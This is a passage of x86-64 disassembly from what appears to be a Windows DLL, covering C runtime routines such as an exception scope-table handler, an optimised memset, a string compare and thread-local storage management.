   1800039dc:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1800039e1:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1800039e6:	48 83 c4 50          	add    $0x50,%rsp
   1800039ea:	5f                   	pop    %rdi
   1800039eb:	c3                   	ret
   1800039ec:	48 83 ec 28          	sub    $0x28,%rsp
   1800039f0:	e8 ff 1b 00 00       	call   0x1800055f4
   1800039f5:	84 c0                	test   %al,%al
   1800039f7:	75 04                	jne    0x1800039fd
   1800039f9:	32 c0                	xor    %al,%al
   1800039fb:	eb 12                	jmp    0x180003a0f
   1800039fd:	e8 de 05 00 00       	call   0x180003fe0
   180003a02:	84 c0                	test   %al,%al
   180003a04:	75 07                	jne    0x180003a0d
   180003a06:	e8 1d 1c 00 00       	call   0x180005628
   180003a0b:	eb ec                	jmp    0x1800039f9
   180003a0d:	b0 01                	mov    $0x1,%al
   180003a0f:	48 83 c4 28          	add    $0x28,%rsp
   180003a13:	c3                   	ret
   180003a14:	48 83 ec 28          	sub    $0x28,%rsp
   180003a18:	e8 03 05 00 00       	call   0x180003f20
   180003a1d:	48 85 c0             	test   %rax,%rax
   180003a20:	0f 95 c0             	setne  %al
   180003a23:	48 83 c4 28          	add    $0x28,%rsp
   180003a27:	c3                   	ret
   180003a28:	48 83 ec 28          	sub    $0x28,%rsp
   180003a2c:	33 c9                	xor    %ecx,%ecx
   180003a2e:	e8 81 04 00 00       	call   0x180003eb4
   180003a33:	b0 01                	mov    $0x1,%al
   180003a35:	48 83 c4 28          	add    $0x28,%rsp
   180003a39:	c3                   	ret
   180003a3a:	cc                   	int3
   180003a3b:	cc                   	int3
   180003a3c:	48 83 ec 28          	sub    $0x28,%rsp
   180003a40:	84 c9                	test   %cl,%cl
   180003a42:	75 0a                	jne    0x180003a4e
   180003a44:	e8 df 05 00 00       	call   0x180004028
   180003a49:	e8 da 1b 00 00       	call   0x180005628
   180003a4e:	b0 01                	mov    $0x1,%al
   180003a50:	48 83 c4 28          	add    $0x28,%rsp
   180003a54:	c3                   	ret
   180003a55:	cc                   	int3
   180003a56:	cc                   	int3
   180003a57:	cc                   	int3
   180003a58:	48 83 ec 28          	sub    $0x28,%rsp
   180003a5c:	e8 c7 05 00 00       	call   0x180004028
   180003a61:	b0 01                	mov    $0x1,%al
   180003a63:	48 83 c4 28          	add    $0x28,%rsp
   180003a67:	c3                   	ret
   180003a68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003a6d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003a72:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003a77:	57                   	push   %rdi
   180003a78:	41 54                	push   %r12
   180003a7a:	41 55                	push   %r13
   180003a7c:	41 56                	push   %r14
   180003a7e:	41 57                	push   %r15
   180003a80:	48 83 ec 40          	sub    $0x40,%rsp
   180003a84:	48 8b e9             	mov    %rcx,%rbp
   180003a87:	4d 8b f9             	mov    %r9,%r15
   180003a8a:	49 8b c8             	mov    %r8,%rcx
   180003a8d:	49 8b f8             	mov    %r8,%rdi
   180003a90:	4c 8b ea             	mov    %rdx,%r13
   180003a93:	e8 0c 1c 00 00       	call   0x1800056a4
   180003a98:	4d 8b 67 08          	mov    0x8(%r15),%r12
   180003a9c:	4d 8b 37             	mov    (%r15),%r14
   180003a9f:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   180003aa3:	4d 2b f4             	sub    %r12,%r14
   180003aa6:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   180003aaa:	41 8b 77 48          	mov    0x48(%r15),%esi
   180003aae:	0f 85 dc 00 00 00    	jne    0x180003b90
   180003ab4:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   180003ab9:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180003abe:	3b 33                	cmp    (%rbx),%esi
   180003ac0:	0f 83 8a 01 00 00    	jae    0x180003c50
   180003ac6:	8b fe                	mov    %esi,%edi
   180003ac8:	48 03 ff             	add    %rdi,%rdi
   180003acb:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   180003acf:	4c 3b f0             	cmp    %rax,%r14
   180003ad2:	0f 82 aa 00 00 00    	jb     0x180003b82
   180003ad8:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   180003adc:	4c 3b f0             	cmp    %rax,%r14
   180003adf:	0f 83 9d 00 00 00    	jae    0x180003b82
   180003ae5:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   180003aea:	0f 84 92 00 00 00    	je     0x180003b82
   180003af0:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   180003af5:	74 17                	je     0x180003b0e
   180003af7:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   180003afb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003b00:	49 03 c4             	add    %r12,%rax
   180003b03:	49 8b d5             	mov    %r13,%rdx
   180003b06:	ff d0                	call   *%rax
   180003b08:	85 c0                	test   %eax,%eax
   180003b0a:	78 7d                	js     0x180003b89
   180003b0c:	7e 74                	jle    0x180003b82
   180003b0e:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   180003b15:	75 28                	jne    0x180003b3f
   180003b17:	48 83 3d 89 49 01 00 	cmpq   $0x0,0x14989(%rip)        # 0x1800184a8
   180003b1e:	00 
   180003b1f:	74 1e                	je     0x180003b3f
   180003b21:	48 8d 0d 80 49 01 00 	lea    0x14980(%rip),%rcx        # 0x1800184a8
   180003b28:	e8 43 39 01 00       	call   0x180017470
   180003b2d:	85 c0                	test   %eax,%eax
   180003b2f:	74 0e                	je     0x180003b3f
   180003b31:	ba 01 00 00 00       	mov    $0x1,%edx
   180003b36:	48 8b cd             	mov    %rbp,%rcx
   180003b39:	ff 15 69 49 01 00    	call   *0x14969(%rip)        # 0x1800184a8
   180003b3f:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   180003b43:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180003b49:	49 03 cc             	add    %r12,%rcx
   180003b4c:	49 8b d5             	mov    %r13,%rdx
   180003b4f:	e8 1c 1b 00 00       	call   0x180005670
   180003b54:	49 8b 47 40          	mov    0x40(%r15),%rax
   180003b58:	4c 8b c5             	mov    %rbp,%r8
   180003b5b:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   180003b5f:	49 8b cd             	mov    %r13,%rcx
   180003b62:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   180003b66:	49 03 d4             	add    %r12,%rdx
   180003b69:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180003b6e:	49 8b 47 28          	mov    0x28(%r15),%rax
   180003b72:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003b77:	ff 15 6b 45 01 00    	call   *0x1456b(%rip)        # 0x1800180e8
   180003b7d:	e8 1e 1b 00 00       	call   0x1800056a0
   180003b82:	ff c6                	inc    %esi
   180003b84:	e9 35 ff ff ff       	jmp    0x180003abe
   180003b89:	33 c0                	xor    %eax,%eax
   180003b8b:	e9 c5 00 00 00       	jmp    0x180003c55
   180003b90:	49 8b 7f 20          	mov    0x20(%r15),%rdi
   180003b94:	44 8b 0b             	mov    (%rbx),%r9d
   180003b97:	49 2b fc             	sub    %r12,%rdi
   180003b9a:	41 3b f1             	cmp    %r9d,%esi
   180003b9d:	0f 83 ad 00 00 00    	jae    0x180003c50
   180003ba3:	45 8b c1             	mov    %r9d,%r8d
   180003ba6:	8b d6                	mov    %esi,%edx
   180003ba8:	41 8b c8             	mov    %r8d,%ecx
   180003bab:	48 03 d2             	add    %rdx,%rdx
   180003bae:	8b 44 d3 04          	mov    0x4(%rbx,%rdx,8),%eax
   180003bb2:	4c 3b f0             	cmp    %rax,%r14
   180003bb5:	0f 82 88 00 00 00    	jb     0x180003c43
   180003bbb:	8b 44 d3 08          	mov    0x8(%rbx,%rdx,8),%eax
   180003bbf:	4c 3b f0             	cmp    %rax,%r14
   180003bc2:	73 7f                	jae    0x180003c43
   180003bc4:	44 8b 5d 04          	mov    0x4(%rbp),%r11d
   180003bc8:	41 83 e3 20          	and    $0x20,%r11d
   180003bcc:	74 44                	je     0x180003c12
   180003bce:	45 33 d2             	xor    %r10d,%r10d
   180003bd1:	45 85 c0             	test   %r8d,%r8d
   180003bd4:	74 34                	je     0x180003c0a
   180003bd6:	41 8b ca             	mov    %r10d,%ecx
   180003bd9:	48 03 c9             	add    %rcx,%rcx
   180003bdc:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   180003be0:	48 3b f8             	cmp    %rax,%rdi
   180003be3:	72 1d                	jb     0x180003c02
   180003be5:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   180003be9:	48 3b f8             	cmp    %rax,%rdi
   180003bec:	73 14                	jae    0x180003c02
   180003bee:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   180003bf2:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   180003bf6:	75 0a                	jne    0x180003c02
   180003bf8:	8b 44 d3 0c          	mov    0xc(%rbx,%rdx,8),%eax
   180003bfc:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   180003c00:	74 08                	je     0x180003c0a
   180003c02:	41 ff c2             	inc    %r10d
   180003c05:	45 3b d0             	cmp    %r8d,%r10d
   180003c08:	72 cc                	jb     0x180003bd6
   180003c0a:	41 8b c9             	mov    %r9d,%ecx
   180003c0d:	45 3b d1             	cmp    %r9d,%r10d
   180003c10:	75 3e                	jne    0x180003c50
   180003c12:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   180003c16:	85 c0                	test   %eax,%eax
   180003c18:	74 0c                	je     0x180003c26
   180003c1a:	48 3b f8             	cmp    %rax,%rdi
   180003c1d:	75 24                	jne    0x180003c43
   180003c1f:	45 85 db             	test   %r11d,%r11d
   180003c22:	75 2c                	jne    0x180003c50
   180003c24:	eb 1d                	jmp    0x180003c43
   180003c26:	8d 46 01             	lea    0x1(%rsi),%eax
   180003c29:	b1 01                	mov    $0x1,%cl
   180003c2b:	41 89 47 48          	mov    %eax,0x48(%r15)
   180003c2f:	44 8b 44 d3 0c       	mov    0xc(%rbx,%rdx,8),%r8d
   180003c34:	49 8b d5             	mov    %r13,%rdx
   180003c37:	4d 03 c4             	add    %r12,%r8
   180003c3a:	41 ff d0             	call   *%r8
   180003c3d:	44 8b 0b             	mov    (%rbx),%r9d
   180003c40:	41 8b c9             	mov    %r9d,%ecx
   180003c43:	ff c6                	inc    %esi
   180003c45:	44 8b c1             	mov    %ecx,%r8d
   180003c48:	3b f1                	cmp    %ecx,%esi
   180003c4a:	0f 82 56 ff ff ff    	jb     0x180003ba6
   180003c50:	b8 01 00 00 00       	mov    $0x1,%eax
   180003c55:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   180003c5a:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180003c5e:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   180003c62:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180003c66:	49 8b e3             	mov    %r11,%rsp
   180003c69:	41 5f                	pop    %r15
   180003c6b:	41 5e                	pop    %r14
   180003c6d:	41 5d                	pop    %r13
   180003c6f:	41 5c                	pop    %r12
   180003c71:	5f                   	pop    %rdi
   180003c72:	c3                   	ret
   180003c73:	cc                   	int3
   180003c74:	cc                   	int3
   180003c75:	cc                   	int3
   180003c76:	cc                   	int3
   180003c77:	cc                   	int3
   180003c78:	cc                   	int3
   180003c79:	cc                   	int3
   180003c7a:	cc                   	int3
   180003c7b:	cc                   	int3
   180003c7c:	cc                   	int3
   180003c7d:	cc                   	int3
   180003c7e:	cc                   	int3
   180003c7f:	cc                   	int3
   180003c80:	cc                   	int3
   180003c81:	cc                   	int3
   180003c82:	cc                   	int3
   180003c83:	cc                   	int3
   180003c84:	cc                   	int3
   180003c85:	cc                   	int3
   180003c86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180003c8d:	00 00 00 
   180003c90:	57                   	push   %rdi
   180003c91:	8b c2                	mov    %edx,%eax
   180003c93:	48 8b f9             	mov    %rcx,%rdi
   180003c96:	49 8b c8             	mov    %r8,%rcx
   180003c99:	f3 aa                	rep stos %al,(%rdi)
   180003c9b:	49 8b c3             	mov    %r11,%rax
   180003c9e:	5f                   	pop    %rdi
   180003c9f:	c3                   	ret
   180003ca0:	cc                   	int3
   180003ca1:	cc                   	int3
   180003ca2:	cc                   	int3
   180003ca3:	cc                   	int3
   180003ca4:	cc                   	int3
   180003ca5:	cc                   	int3
   180003ca6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180003cad:	00 00 00 
   180003cb0:	4c 8b d9             	mov    %rcx,%r11
   180003cb3:	0f b6 d2             	movzbl %dl,%edx
   180003cb6:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   180003cbd:	01 01 01 
   180003cc0:	4c 0f af ca          	imul   %rdx,%r9
   180003cc4:	49 83 f8 10          	cmp    $0x10,%r8
   180003cc8:	0f 86 f2 00 00 00    	jbe    0x180003dc0
   180003cce:	66 49 0f 6e c1       	movq   %r9,%xmm0
   180003cd3:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   180003cd7:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   180003cde:	77 10                	ja     0x180003cf0
   180003ce0:	e9 6b 00 00 00       	jmp    0x180003d50
   180003ce5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180003cec:	00 00 00 00 
   180003cf0:	f6 05 79 04 02 00 02 	testb  $0x2,0x20479(%rip)        # 0x180024170
   180003cf7:	75 97                	jne    0x180003c90
   180003cf9:	0f 11 01             	movups %xmm0,(%rcx)
   180003cfc:	4c 03 c1             	add    %rcx,%r8
   180003cff:	48 83 c1 10          	add    $0x10,%rcx
   180003d03:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   180003d07:	4c 2b c1             	sub    %rcx,%r8
   180003d0a:	4d 8b c8             	mov    %r8,%r9
   180003d0d:	49 c1 e9 07          	shr    $0x7,%r9
   180003d11:	74 3d                	je     0x180003d50
   180003d13:	4c 3b 0d 0e f3 01 00 	cmp    0x1f30e(%rip),%r9        # 0x180023028
   180003d1a:	0f 87 60 00 00 00    	ja     0x180003d80
   180003d20:	0f 29 01             	movaps %xmm0,(%rcx)
   180003d23:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   180003d27:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   180003d2e:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   180003d32:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   180003d36:	49 ff c9             	dec    %r9
   180003d39:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   180003d3d:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   180003d41:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   180003d45:	66 0f 29 41 f0       	movapd %xmm0,-0x10(%rcx)
   180003d4a:	75 d4                	jne    0x180003d20
   180003d4c:	49 83 e0 7f          	and    $0x7f,%r8
   180003d50:	4d 8b c8             	mov    %r8,%r9
   180003d53:	49 c1 e9 04          	shr    $0x4,%r9
   180003d57:	74 13                	je     0x180003d6c
   180003d59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003d60:	0f 11 01             	movups %xmm0,(%rcx)
   180003d63:	48 83 c1 10          	add    $0x10,%rcx
   180003d67:	49 ff c9             	dec    %r9
   180003d6a:	75 f4                	jne    0x180003d60
   180003d6c:	49 83 e0 0f          	and    $0xf,%r8
   180003d70:	74 06                	je     0x180003d78
   180003d72:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   180003d78:	49 8b c3             	mov    %r11,%rax
   180003d7b:	c3                   	ret
   180003d7c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003d80:	0f 2b 01             	movntps %xmm0,(%rcx)
   180003d83:	0f 2b 41 10          	movntps %xmm0,0x10(%rcx)
   180003d87:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   180003d8e:	0f 2b 41 a0          	movntps %xmm0,-0x60(%rcx)
   180003d92:	0f 2b 41 b0          	movntps %xmm0,-0x50(%rcx)
   180003d96:	49 ff c9             	dec    %r9
   180003d99:	0f 2b 41 c0          	movntps %xmm0,-0x40(%rcx)
   180003d9d:	0f 2b 41 d0          	movntps %xmm0,-0x30(%rcx)
   180003da1:	0f 2b 41 e0          	movntps %xmm0,-0x20(%rcx)
   180003da5:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   180003da9:	75 d5                	jne    0x180003d80
   180003dab:	0f ae f8             	sfence
   180003dae:	49 83 e0 7f          	and    $0x7f,%r8
   180003db2:	eb 9c                	jmp    0x180003d50
   180003db4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   180003dbb:	00 00 00 00 00 
   180003dc0:	49 8b d1             	mov    %r9,%rdx
   180003dc3:	4c 8d 0d 36 c2 ff ff 	lea    -0x3dca(%rip),%r9        # 0x180000000
   180003dca:	43 8b 84 81 00 70 02 	mov    0x27000(%r9,%r8,4),%eax
   180003dd1:	00 
   180003dd2:	4c 03 c8             	add    %rax,%r9
   180003dd5:	49 03 c8             	add    %r8,%rcx
   180003dd8:	49 8b c3             	mov    %r11,%rax
   180003ddb:	41 ff e1             	jmp    *%r9
   180003dde:	66 90                	xchg   %ax,%ax
   180003de0:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   180003de4:	89 51 f9             	mov    %edx,-0x7(%rcx)
   180003de7:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   180003deb:	88 51 ff             	mov    %dl,-0x1(%rcx)
   180003dee:	c3                   	ret
   180003def:	90                   	nop
   180003df0:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   180003df4:	89 51 fc             	mov    %edx,-0x4(%rcx)
   180003df7:	c3                   	ret
   180003df8:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   180003dfc:	88 51 ff             	mov    %dl,-0x1(%rcx)
   180003dff:	c3                   	ret
   180003e00:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   180003e04:	89 51 fb             	mov    %edx,-0x5(%rcx)
   180003e07:	88 51 ff             	mov    %dl,-0x1(%rcx)
   180003e0a:	c3                   	ret
   180003e0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003e10:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   180003e14:	89 51 fa             	mov    %edx,-0x6(%rcx)
   180003e17:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   180003e1b:	c3                   	ret
   180003e1c:	48 89 10             	mov    %rdx,(%rax)
   180003e1f:	c3                   	ret
   180003e20:	48 89 10             	mov    %rdx,(%rax)
   180003e23:	66 89 50 08          	mov    %dx,0x8(%rax)
   180003e27:	88 50 0a             	mov    %dl,0xa(%rax)
   180003e2a:	c3                   	ret
   180003e2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003e30:	48 89 10             	mov    %rdx,(%rax)
   180003e33:	66 89 50 08          	mov    %dx,0x8(%rax)
   180003e37:	c3                   	ret
   180003e38:	48 89 10             	mov    %rdx,(%rax)
   180003e3b:	48 89 50 08          	mov    %rdx,0x8(%rax)
   180003e3f:	c3                   	ret
   180003e40:	48 3b ca             	cmp    %rdx,%rcx
   180003e43:	74 19                	je     0x180003e5e
   180003e45:	48 83 c2 09          	add    $0x9,%rdx
   180003e49:	48 8d 41 09          	lea    0x9(%rcx),%rax
   180003e4d:	48 2b d0             	sub    %rax,%rdx
   180003e50:	8a 08                	mov    (%rax),%cl
   180003e52:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   180003e55:	75 0a                	jne    0x180003e61
   180003e57:	48 ff c0             	inc    %rax
   180003e5a:	84 c9                	test   %cl,%cl
   180003e5c:	75 f2                	jne    0x180003e50
   180003e5e:	33 c0                	xor    %eax,%eax
   180003e60:	c3                   	ret
   180003e61:	1b c0                	sbb    %eax,%eax
   180003e63:	83 c8 01             	or     $0x1,%eax
   180003e66:	c3                   	ret
   180003e67:	cc                   	int3
   180003e68:	40 53                	rex push %rbx
   180003e6a:	48 83 ec 20          	sub    $0x20,%rsp
   180003e6e:	ff 15 8c 42 01 00    	call   *0x1428c(%rip)        # 0x180018100
   180003e74:	48 85 c0             	test   %rax,%rax
   180003e77:	74 13                	je     0x180003e8c
   180003e79:	48 8b 18             	mov    (%rax),%rbx
   180003e7c:	48 8b c8             	mov    %rax,%rcx
   180003e7f:	e8 30 7f 00 00       	call   0x18000bdb4
   180003e84:	48 8b c3             	mov    %rbx,%rax
   180003e87:	48 85 db             	test   %rbx,%rbx
   180003e8a:	75 ed                	jne    0x180003e79
   180003e8c:	48 83 c4 20          	add    $0x20,%rsp
   180003e90:	5b                   	pop    %rbx
   180003e91:	c3                   	ret
   180003e92:	cc                   	int3
   180003e93:	cc                   	int3
   180003e94:	48 83 ec 28          	sub    $0x28,%rsp
   180003e98:	48 85 c9             	test   %rcx,%rcx
   180003e9b:	74 11                	je     0x180003eae
   180003e9d:	48 8d 05 fc 02 02 00 	lea    0x202fc(%rip),%rax        # 0x1800241a0
   180003ea4:	48 3b c8             	cmp    %rax,%rcx
   180003ea7:	74 05                	je     0x180003eae
   180003ea9:	e8 06 7f 00 00       	call   0x18000bdb4
   180003eae:	48 83 c4 28          	add    $0x28,%rsp
   180003eb2:	c3                   	ret
   180003eb3:	cc                   	int3
   180003eb4:	40 53                	rex push %rbx
   180003eb6:	48 83 ec 20          	sub    $0x20,%rsp
   180003eba:	48 8b d9             	mov    %rcx,%rbx
   180003ebd:	8b 0d 6d f1 01 00    	mov    0x1f16d(%rip),%ecx        # 0x180023030
   180003ec3:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180003ec6:	74 33                	je     0x180003efb
   180003ec8:	48 85 db             	test   %rbx,%rbx
   180003ecb:	75 0e                	jne    0x180003edb
   180003ecd:	e8 e6 19 00 00       	call   0x1800058b8
   180003ed2:	8b 0d 58 f1 01 00    	mov    0x1f158(%rip),%ecx        # 0x180023030
   180003ed8:	48 8b d8             	mov    %rax,%rbx
   180003edb:	33 d2                	xor    %edx,%edx
   180003edd:	e8 1e 1a 00 00       	call   0x180005900
   180003ee2:	48 85 db             	test   %rbx,%rbx
   180003ee5:	74 14                	je     0x180003efb
   180003ee7:	48 8d 05 b2 02 02 00 	lea    0x202b2(%rip),%rax        # 0x1800241a0
   180003eee:	48 3b d8             	cmp    %rax,%rbx
   180003ef1:	74 08                	je     0x180003efb
   180003ef3:	48 8b cb             	mov    %rbx,%rcx
   180003ef6:	e8 b9 7e 00 00       	call   0x18000bdb4
   180003efb:	48 83 c4 20          	add    $0x20,%rsp
   180003eff:	5b                   	pop    %rbx
   180003f00:	c3                   	ret
   180003f01:	cc                   	int3
   180003f02:	cc                   	int3
   180003f03:	cc                   	int3
   180003f04:	48 83 ec 28          	sub    $0x28,%rsp
   180003f08:	e8 13 00 00 00       	call   0x180003f20
   180003f0d:	48 85 c0             	test   %rax,%rax
   180003f10:	74 05                	je     0x180003f17
   180003f12:	48 83 c4 28          	add    $0x28,%rsp
   180003f16:	c3                   	ret
   180003f17:	e8 d8 7e 00 00       	call   0x18000bdf4
   180003f1c:	cc                   	int3
   180003f1d:	cc                   	int3
   180003f1e:	cc                   	int3
   180003f1f:	cc                   	int3
   180003f20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003f25:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003f2a:	57                   	push   %rdi
   180003f2b:	48 83 ec 20          	sub    $0x20,%rsp
   180003f2f:	83 3d fa f0 01 00 ff 	cmpl   $0xffffffff,0x1f0fa(%rip)        # 0x180023030
   180003f36:	75 07                	jne    0x180003f3f
   180003f38:	33 c0                	xor    %eax,%eax
   180003f3a:	e9 90 00 00 00       	jmp    0x180003fcf
   180003f3f:	ff 15 c3 41 01 00    	call   *0x141c3(%rip)        # 0x180018108
   180003f45:	8b 0d e5 f0 01 00    	mov    0x1f0e5(%rip),%ecx        # 0x180023030
   180003f4b:	8b f8                	mov    %eax,%edi
   180003f4d:	e8 66 19 00 00       	call   0x1800058b8
   180003f52:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180003f56:	33 f6                	xor    %esi,%esi
   180003f58:	48 3b c2             	cmp    %rdx,%rax
   180003f5b:	74 67                	je     0x180003fc4
   180003f5d:	48 85 c0             	test   %rax,%rax
   180003f60:	74 05                	je     0x180003f67
   180003f62:	48 8b f0             	mov    %rax,%rsi
   180003f65:	eb 5d                	jmp    0x180003fc4
   180003f67:	8b 0d c3 f0 01 00    	mov    0x1f0c3(%rip),%ecx        # 0x180023030
   180003f6d:	e8 8e 19 00 00       	call   0x180005900
   180003f72:	85 c0                	test   %eax,%eax
   180003f74:	74 4e                	je     0x180003fc4
   180003f76:	ba 80 00 00 00       	mov    $0x80,%edx
   180003f7b:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   180003f7e:	e8 29 7f 00 00       	call   0x18000beac
   180003f83:	8b 0d a7 f0 01 00    	mov    0x1f0a7(%rip),%ecx        # 0x180023030
   180003f89:	48 8b d8             	mov    %rax,%rbx
   180003f8c:	48 85 c0             	test   %rax,%rax
   180003f8f:	74 24                	je     0x180003fb5
   180003f91:	48 8b d0             	mov    %rax,%rdx
   180003f94:	e8 67 19 00 00       	call   0x180005900
   180003f99:	85 c0                	test   %eax,%eax
   180003f9b:	74 12                	je     0x180003faf
   180003f9d:	48 8b c3             	mov    %rbx,%rax
   180003fa0:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   180003fa7:	48 8b de             	mov    %rsi,%rbx
   180003faa:	48 8b f0             	mov    %rax,%rsi
   180003fad:	eb 0d                	jmp    0x180003fbc
   180003faf:	8b 0d 7b f0 01 00    	mov    0x1f07b(%rip),%ecx        # 0x180023030
   180003fb5:	33 d2                	xor    %edx,%edx
   180003fb7:	e8 44 19 00 00       	call   0x180005900
   180003fbc:	48 8b cb             	mov    %rbx,%rcx
   180003fbf:	e8 f0 7d 00 00       	call   0x18000bdb4
   180003fc4:	8b cf                	mov    %edi,%ecx
   180003fc6:	ff 15 44 41 01 00    	call   *0x14144(%rip)        # 0x180018110
   180003fcc:	48 8b c6             	mov    %rsi,%rax
   180003fcf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003fd4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003fd9:	48 83 c4 20          	add    $0x20,%rsp
   180003fdd:	5f                   	pop    %rdi
   180003fde:	c3                   	ret
   180003fdf:	cc                   	int3
   180003fe0:	48 83 ec 28          	sub    $0x28,%rsp
   180003fe4:	48 8d 0d a9 fe ff ff 	lea    -0x157(%rip),%rcx        # 0x180003e94
   180003feb:	e8 38 18 00 00       	call   0x180005828
   180003ff0:	89 05 3a f0 01 00    	mov    %eax,0x1f03a(%rip)        # 0x180023030
   180003ff6:	83 f8 ff             	cmp    $0xffffffff,%eax
   180003ff9:	74 25                	je     0x180004020
   180003ffb:	48 8d 15 9e 01 02 00 	lea    0x2019e(%rip),%rdx        # 0x1800241a0
   180004002:	8b c8                	mov    %eax,%ecx
   180004004:	e8 f7 18 00 00       	call   0x180005900
   180004009:	85 c0                	test   %eax,%eax
   18000400b:	74 0e                	je     0x18000401b
   18000400d:	c7 05 01 02 02 00 fe 	movl   $0xfffffffe,0x20201(%rip)        # 0x180024218
   180004014:	ff ff ff 
   180004017:	b0 01                	mov    $0x1,%al
   180004019:	eb 07                	jmp    0x180004022
   18000401b:	e8 08 00 00 00       	call   0x180004028
   180004020:	32 c0                	xor    %al,%al
   180004022:	48 83 c4 28          	add    $0x28,%rsp
   180004026:	c3                   	ret
   180004027:	cc                   	int3
   180004028:	48 83 ec 28          	sub    $0x28,%rsp
   18000402c:	8b 0d fe ef 01 00    	mov    0x1effe(%rip),%ecx        # 0x180023030
   180004032:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180004035:	74 0c                	je     0x180004043
   180004037:	e8 34 18 00 00       	call   0x180005870
   18000403c:	83 0d ed ef 01 00 ff 	orl    $0xffffffff,0x1efed(%rip)        # 0x180023030
   180004043:	b0 01                	mov    $0x1,%al
   180004045:	48 83 c4 28          	add    $0x28,%rsp
   180004049:	c3                   	ret
   18000404a:	cc                   	int3
   18000404b:	cc                   	int3
   18000404c:	48 83 ec 28          	sub    $0x28,%rsp
   180004050:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   180004054:	4d 8b d0             	mov    %r8,%r10
   180004057:	48 8b 01             	mov    (%rcx),%rax
   18000405a:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   18000405e:	83 f8 fe             	cmp    $0xfffffffe,%eax
   180004061:	75 0b                	jne    0x18000406e
   180004063:	4c 8b 02             	mov    (%rdx),%r8
   180004066:	49 8b ca             	mov    %r10,%rcx
   180004069:	e8 82 00 00 00       	call   0x1800040f0
   18000406e:	48 83 c4 28          	add    $0x28,%rsp
   180004072:	c3                   	ret
   180004073:	cc                   	int3
   180004074:	40 53                	rex push %rbx
   180004076:	48 83 ec 20          	sub    $0x20,%rsp
   18000407a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   18000407f:	49 8b d8             	mov    %r8,%rbx
   180004082:	e8 51 f2 ff ff       	call   0x1800032d8
   180004087:	48 8b 08             	mov    (%rax),%rcx
